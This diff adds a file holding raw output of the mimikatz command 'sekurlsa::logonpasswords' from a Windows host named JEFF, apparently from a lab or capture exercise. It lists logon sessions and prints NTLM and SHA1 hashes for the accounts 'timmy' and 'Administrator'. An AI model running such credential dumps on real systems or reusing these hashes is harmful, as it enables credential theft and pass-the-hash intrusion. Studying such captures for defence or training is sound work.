@@ -1,0 +1,294 @@
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1024094 (00000000:000fa05e)
+Session           : RemoteInteractive from 2
+User Name         : timmy
+Domain            : JEFF
+Logon Server      : JEFF
+Logon Time        : 4/14/2021 8:18:25 AM
+SID               : S-1-5-21-2054229937-3378926844-942710724-1002
+        msv :
+         [00000003] Primary
+         * Username : timmy
+         * Domain   : JEFF
+         * NTLM     : fe8c94ae699876cabc315397dd7f3489
+         * SHA1     : 885f7144e7707f5bf37c50158492f0c50d946926
+        tspkg :
+        wdigest :
+         * Username : timmy
+         * Domain   : JEFF
+         * Password : (null)
+        kerberos :
+         * Username : timmy
+         * Domain   : JEFF
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1002600 (00000000:000f4c68)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/14/2021 8:18:16 AM
+SID               : S-1-5-90-0-2
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1002142 (00000000:000f4a9e)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/14/2021 8:18:16 AM
+SID               : S-1-5-96-0-2
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 51213 (00000000:0000c80d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/10/2021 10:15:44 AM
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : JEFF$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 3/10/2021 10:15:44 AM
+SID               : S-1-5-20
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : jeff$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 32919 (00000000:00008097)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/10/2021 10:15:44 AM
+SID               : S-1-5-96-0-0
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1024133 (00000000:000fa085)
+Session           : RemoteInteractive from 2
+User Name         : timmy
+Domain            : JEFF
+Logon Server      : JEFF
+Logon Time        : 4/14/2021 8:18:25 AM
+SID               : S-1-5-21-2054229937-3378926844-942710724-1002
+        msv :
+         [00000003] Primary
+         * Username : timmy
+         * Domain   : JEFF
+         * NTLM     : fe8c94ae699876cabc315397dd7f3489
+         * SHA1     : 885f7144e7707f5bf37c50158492f0c50d946926
+        tspkg :
+        wdigest :
+         * Username : timmy
+         * Domain   : JEFF
+         * Password : (null)
+        kerberos :
+         * Username : timmy
+         * Domain   : JEFF
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1003533 (00000000:000f500d)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/14/2021 8:18:16 AM
+SID               : S-1-5-90-0-2
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 549747 (00000000:00086373)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : JEFF
+Logon Server      : JEFF
+Logon Time        : 4/14/2021 7:57:43 AM
+SID               : S-1-5-21-2054229937-3378926844-942710724-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : JEFF
+         * NTLM     : 6b0e72ee64ea42ca092bd1a7449fa46e
+         * SHA1     : 043fa07c48653944dbbb883b82cba18ae6b2efe2
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : JEFF
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : JEFF
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 395671 (00000000:00060997)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : JEFF
+Logon Server      : JEFF
+Logon Time        : 3/10/2021 10:18:09 AM
+SID               : S-1-5-21-2054229937-3378926844-942710724-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : JEFF
+         * NTLM     : 6b0e72ee64ea42ca092bd1a7449fa46e
+         * SHA1     : 043fa07c48653944dbbb883b82cba18ae6b2efe2
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : JEFF
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : JEFF
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/10/2021 10:15:45 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 51163 (00000000:0000c7db)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/10/2021 10:15:44 AM
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 32886 (00000000:00008076)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/10/2021 10:15:44 AM
+SID               : S-1-5-96-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 31874 (00000000:00007c82)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3/10/2021 10:15:44 AM
+SID               :
+        msv :
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : JEFF$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 3/10/2021 10:15:44 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JEFF$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : jeff$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
